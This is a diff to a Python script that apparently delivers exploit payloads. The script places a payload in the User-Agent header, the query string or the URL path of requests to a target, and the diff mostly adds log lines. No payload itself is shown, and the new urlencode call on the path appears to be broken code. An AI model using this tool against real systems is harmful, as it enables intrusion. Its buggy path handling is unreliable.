@@ -67,13 +67,16 @@ def make_request(args, payload):
 
     # add payloads based on flags
     if args.payload_all or args.payload_header:
+        print(f' i| setting payload in User-Agent header')
         headers['User-Agent'] = payload
 
     if args.payload_all or args.payload_query_string:
+        print(f' i| setting payload as query string \'q\'')
         params['q'] = payload
 
     if args.payload_all or args.payload_path:
-        target = urljoin(target, payload)
+        print(f' i| setting payload as part of the uri path')
+        target = urljoin(target, urlencode(payload))
 
     # fire ze lazor
     print(f' i| sending exploit payload {payload} to {target}')
@@ -86,6 +89,7 @@ def make_request(args, payload):
             print(f' i| response: {r.text}')
     except Exception as e:
         print(f' e| failed to make request: {e}')
+
 
 
 
@@ -152,4 +156,5 @@ def main():
 
 if __name__ == '__main__':
     main()
+
 
